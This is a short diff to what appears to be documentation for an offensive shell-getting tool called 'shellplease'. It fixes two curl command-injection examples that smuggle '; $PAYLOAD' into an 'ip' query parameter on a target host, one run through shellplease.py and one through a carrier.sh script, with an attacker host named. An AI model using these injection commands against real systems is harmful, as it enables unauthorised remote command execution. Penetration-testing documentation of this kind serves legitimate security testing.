@@ -37,14 +37,14 @@ We can use shellplease to see what executables/commands can be used to obtain a 
 ```sh
 # attacker: 192.168.1.100
 # target: 192.168.1.5
-shellplease.py -H 192.168.1.100 -c "curl http://192.168.1.5/ -G --data-urlencode \"?ip=x; \$PAYLOAD\""
+shellplease.py -H 192.168.1.100 -c "curl http://192.168.1.5/ -G --data-urlencode \"ip=x; \$PAYLOAD\""
 ```
 
 Alternatively, we can use a script to carry the payload
 ```sh
 #!/bin/sh
 # carrier.sh
-curl http://192.168.1.5/ -G --data-urlencode "?ip=x; $PAYLOAD"
+curl http://192.168.1.5/ -G --data-urlencode "ip=x; $PAYLOAD"
 ```
 
 ### Command Execution vis PSExec
